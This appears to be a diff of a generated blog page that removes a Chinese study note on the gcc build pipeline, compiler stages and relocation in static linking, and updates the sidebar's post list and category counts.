-    <a class="article-category-link" href="/categories/study/">study</a> > <a class="article-category-link" href="/categories/study/book/">book</a> > <a class="article-category-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a>
-  </div>
-
-      
-      
-<a href="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="编译和链接"><a href="#编译和链接" class="headerlink" title="编译和链接"></a>编译和链接</h1><p>如果说“编译和链接这几个字不够熟悉， 那说”Build“就再熟悉不过了吧。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc program.c</span><br></pre></td></tr></table></figure>
-
-<p>事实上以上操作涵盖了四个部分：预处理Prepressing、编译compilation、汇编assembly、链接linking；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/gcc.jpg" alt="gcc"></p>
-<h2 id="不为人知的动作"><a href="#不为人知的动作" class="headerlink" title="不为人知的动作"></a>不为人知的动作</h2><h3 id="预编译"><a href="#预编译" class="headerlink" title="预编译"></a>预编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -E program.c			// 生成预编译文件</span><br><span class="line">cpp program.c &gt; program.i</span><br></pre></td></tr></table></figure>
-
-<p>预编译主要处理的是源代码文件中<strong>以“#”开头</strong>的预编译指令；</p>
-<p>包括：</p>
-<ol>
-<li>将所有“#define”删除，展开所有<strong>宏定义</strong>；</li>
-<li>处理所有<strong>条件预编译</strong>指令，如#if等；</li>
-<li>处理**#include**预编译指令，被包含的文件插入到该预编译指令的位置；</li>
-<li>删除所有<strong>注释</strong>；</li>
-<li><strong>添加代码行号和文件名标识</strong>，以便于编译时编译器产生调试用的行号信息与用于编译时产生编译错误或警告时能够显示行号；</li>
-<li>保留所有**#pragma**编译器指令；</li>
-</ol>
-<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -S program.i -o program.s</span><br></pre></td></tr></table></figure>
-
-<p>编译把预编译处理完的文件进行一系列词法<strong>分析</strong>、语法分析、语义<strong>分析</strong>、优化后产生的<strong>汇编代码</strong>文件；</p>
-<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c program.s -o program.o</span><br></pre></td></tr></table></figure>
-
-<p>汇编器将汇编代码办成机器可以执行的指令，几乎依据汇编语句对应一条机器指令（翻译）；</p>
-<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>链接是一个复杂的过程，有许多文件参与进来，下一章详细总结；</p>
-<h2 id="编译器做了啥"><a href="#编译器做了啥" class="headerlink" title="编译器做了啥"></a>编译器做了啥</h2><p>直观地说，编译器是将高级语言翻译成机器语言的一个工具；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/complie_step.jpg" alt="complie_step"></p>
-<p><strong>扫描</strong>=&gt;<strong>语法分析</strong>=&gt;<strong>语义分析</strong>=&gt;<strong>源代码优化</strong>=&gt;<strong>代码生成</strong>=&gt;<strong>目标代码优化</strong></p>
-<p>示例代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array[index] = (index + 4) * (2 + 6)</span><br><span class="line">CompilerExpression.c</span><br></pre></td></tr></table></figure>
-
-<h3 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h3><p><strong>扫描器scanner</strong>做的任务就是<strong>词法分析</strong>，用的是一种类似于<strong>有限状态机（Finite State Machine）</strong>的算法，可以轻松将源代码字符序列分割成一系列的记号（Token），如上代码共有28个非空字符，扫描后产生16个记号，“index”作为标识符为一个记号；</p>
-<p>这些记号会分类，标识符存放到<strong>符号表</strong>，数字、字符串常量存放到<strong>文字表</strong>中；</p>
-<p>一个名为<strong>lex</strong>的程序可以<strong>实现词法扫描</strong>，有了它，编译器开发者只需要改变<strong>词法规则</strong>就可以了；</p>
-<h3 id="语法分析"><a href="#语法分析" class="headerlink" title="语法分析"></a>语法分析</h3><p><strong>语法分析器Grammar Parser</strong>对记号进行<strong>语法分析</strong>，生成<strong>语法树Syntax Tree</strong>，采用的是<strong>上下文无关语法Context-free Grammar</strong>的分析手段；</p>
-<p>语法树是以表达式Expression为节点的树，以上面的代码为例，语法树为：</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/syntax_tree.jpg" alt="syntax_tree"></p>
-<p>整个语句被看作是<strong>一个赋值表达式</strong>；</p>
-<p>树的<strong>左边</strong>是<strong>数组</strong>表达式，<strong>右边</strong>是<strong>乘法</strong>表达式；</p>
-<p><strong>数组</strong>表达式由<strong>两个符号表达式</strong>组成；</p>
-<p>由于<strong>符号</strong>和<strong>数字</strong>是<strong>最小的表达式</strong>，所以也作为整个<strong>语法树的叶节点</strong>；</p>
-<p>语法分析器需要解决的是<strong>区分表达式的含义</strong>，在<strong>不合法</strong>表达式出现时<strong>要报错</strong>；</p>
-<p>一个名为yacc的工具，根据用户给定的语法规则对几号序列进行解析，构件语法树，对于不同编程语言只需要改变语法规则即可（编译器编译器Compiler Compiler）；</p>
-<h3 id="语义分析器"><a href="#语义分析器" class="headerlink" title="语义分析器"></a>语义分析器</h3><p>顾名思义，<strong>语义分析器Semantic Analyzer</strong>进行<strong>语义分析</strong>，完成了对表达式的<strong>语法层面的分析</strong>，但是并<strong>不了解语句是否真的有意义</strong>；</p>
-<p>语义分析器能分析的语义是<strong>静态语义Static Semantic</strong>，是编译期间就可以确定的语义；</p>
-<p>不能分析动态语义Dynamic Semantic，这是运行期见才能确定的语义；</p>
-<p>语义分析器将语法树的<strong>表达式标识为类型</strong>，上图语法树将转化为：</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/semantic_tree.jpg" alt="semantic_tree"></p>
-<h3 id="源码级优化器"><a href="#源码级优化器" class="headerlink" title="源码级优化器"></a>源码级优化器</h3><p>源代码级优化器Source Code Optimizer在源代码级别进行优化；</p>
-<p>例如，2+6的结果是确定的，结果8可以被优化保存；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/code_optimize.jpg" alt="code_optimize"></p>
-<p>可以看到，优化器将语法树转换成了中间代码Intermediate Code，这已经非常接近目标代码了，但是它一般跟目标机器和运行时环境是无关的，比如没有数据尺寸、变量地址和寄存器名字等；</p>
-<p>中间代码有很多类型，不同编译器中有不同的形式，常见有：</p>
-<ol>
-<li><p>三地址码Three-address Code：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = y op z</span><br></pre></td></tr></table></figure>
-
-<p>将变量y和z进行op操作以后，赋值给x；</p>
-<p>上面代码可以转化为以下步骤：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t1 = 2 + 6</span><br><span class="line">t2 = index + 4</span><br><span class="line">t3 = t2 * t1</span><br><span class="line">array[index] = t3</span><br></pre></td></tr></table></figure>
-
-<p>由于优化程序的作用：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">t2 = index + 4</span><br><span class="line">t2 = t2 * 8</span><br><span class="line">array[index] = t2</span><br></pre></td></tr></table></figure></li>
-<li><p>P-code</p>
-</li>
-</ol>
-<p>中间代码使得<strong>编译器被分为前端和后端</strong>，<strong>前端</strong>负责产生<strong>机器无关的中间代码</strong>，<strong>后端</strong>将中间代码转换成<strong>目标机器代码</strong>；</p>
-<h3 id="代码生成器和目标代码优化器"><a href="#代码生成器和目标代码优化器" class="headerlink" title="代码生成器和目标代码优化器"></a>代码生成器和目标代码优化器</h3><p><strong>代码生成器Code Generator</strong>和<strong>目标代码优化器Target Code Optimizer</strong>属于<strong>编译器后端</strong>；</p>
-<h4 id="代码生成器"><a href="#代码生成器" class="headerlink" title="代码生成器"></a>代码生成器</h4><p>中间代码 =&gt; 目标机器代码（这依赖于目标机器）</p>
-<h4 id="目标代码优化器"><a href="#目标代码优化器" class="headerlink" title="目标代码优化器"></a>目标代码优化器</h4><p>对目标代码进行优化，比如选择合适的寻址方式、使用位移来代替乘法运算等；</p>
-<p>经过这么多的程序，源代码变成了目标代码，但是index和array的地址还未确定，要如何得到它们的地址呢？</p>
-<p>事实上<strong>绝对地址</strong>要在<strong>最终链接的时候才能确定</strong>，因此<strong>编译器完成的工作是将一个源代码文件编译成一个未链接的目标文件，然后链接器最终将目标文件链接起来形成可执行文件</strong>；</p>
-<h2 id="链接器"><a href="#链接器" class="headerlink" title="链接器"></a>链接器</h2><p>计算各个目标地址的过程被叫做<strong>重定位Relocation</strong>；</p>
-<p>假设存在这样的指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp foo</span><br></pre></td></tr></table></figure>
-
-<p>意思为跳转到foo表示的地址执行，而foo的符号Symbol就尤为重要，当有指令引用了它，只需要记住foo这个地址，直接修正就可以了；因此模块间符号的引用成为了彼此联系且保证程序正确执行的关键；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/module_association.jpg" alt="module_association"></p>
-<h2 id="模块拼装——静态链接"><a href="#模块拼装——静态链接" class="headerlink" title="模块拼装——静态链接"></a>模块拼装——静态链接</h2><p>链接Linking就是将<strong>模块组装</strong>起来，各个模块之间相互引用的部分处理好了，程序在引用和调用时就能<strong>找到目标符号确定位置</strong>而不会出错；</p>
-<p>而链接的过程主要包括：</p>
-<ol>
-<li><strong>地址和空间分配</strong></li>
-<li><strong>符号决议</strong>（或是熟知的<strong>符号绑定</strong>，然而这个说法很“动态”）</li>
-<li><strong>重定位</strong></li>
-</ol>
-<p>下图演示了具体流程，每个模块段代码文件.c经过编译器编译成目标文件.o，<strong>目标文件</strong>和<strong>库Library</strong>一起链接形成最终的可执行文件；</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/compile%E4%B8%8Elink/static_linking.jpg" alt="static_linking"></p>
-<p>这里的库最常见的就是<strong>运行时库Runtime Library</strong>，是支持程序运行的基本函数的集合，是一组目标文件包，存放了常用代码编译后的目标文件集合；</p>
-<p>讲一个具体的例子就可以了；</p>
-<p>假设<strong>main.c中使用了另个一个模块func.c中的函数func()<strong>，则在调用这个函数时必须要知道</strong>func()函数存放的地址</strong>。但是每个模块是单独编译的，显然<strong>main.c不知道，而func.c知道</strong>，因此main.c会暂时<strong>把这个地址放一放</strong>，等最<strong>后链接的时候让链接器去填充修正</strong>。链接器在链接的时候<strong>根据所引用的符号func</strong>，自动去查找func.c模块中的func函数地址，然后把这些信息<strong>填充修正到main.c模块</strong>中，<strong>这个填充修正的过程正是重定位</strong>，而这个被修正的地方叫<strong>重定位入口</strong>。当然也可以把链接器想成一个裁缝，这是在打补丁；</p>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/9/index.html">https://www.jk404.cn/page/9/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
 
     <nav id="page-nav">
 
@@ -1271,6 +1258,14 @@ PIE:      No PIE (0x400000)
       <ul>
         
           <li>
+            <a href="/course/static-program-analysis/static-program-analysis-06-pointer-analysis/">static_program_analysis_06_pointer_analysis</a>
+          </li>
+        
+          <li>
+            <a href="/OS/OS-02-lab-prepare/">OS_02_lab_prepare</a>
+          </li>
+        
+          <li>
             <a href="/Taichi/Taichi-02-Metaprogramming-and-Object-Oriented/">Taichi_02_Metaprogramming_and_Object_Oriented</a>
           </li>
         
@@ -1280,14 +1275,6 @@ PIE:      No PIE (0x400000)
         
           <li>
             <a href="/Taichi/Taichi-00-introduction/">Taichi_00_introduction</a>
-          </li>
-        
-          <li>
-            <a href="/OS/theory/OS-01-summary/">OS_01_summary</a>
-          </li>
-        
-          <li>
-            <a href="/OS/Prepare/OS-prepare/">OS_prepare</a>
           </li>
         
       </ul>
@@ -1302,7 +1289,7 @@ PIE:      No PIE (0x400000)
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/susctf2022/">susctf2022</a><span class="category-list-count">2</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">15</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/Prepare/">Prepare</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/theory/">theory</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Taichi/">Taichi</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/">UE4</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/LowPoly/">LowPoly</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">5</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter01-Program-interaction/">Chapter01 Program interaction</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Chapter02-Binary-file/">Chapter02 Binary file</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/Introduciton/">Introduciton</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">18</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">17</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">10</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">32</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">14</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/susctf2022/">susctf2022</a><span class="category-list-count">2</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/Prepare/">Prepare</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/theory/">theory</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">6</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/microcorruption/">microcorruption</a><span class="category-list-count">4</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/Taichi/">Taichi</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/">UE4</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/UE4/LowPoly/">LowPoly</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">7</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/static-program-analysis/">static_program_analysis</a><span class="category-list-count">6</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/golang/start/">start</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn-college/">pwn.college</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" 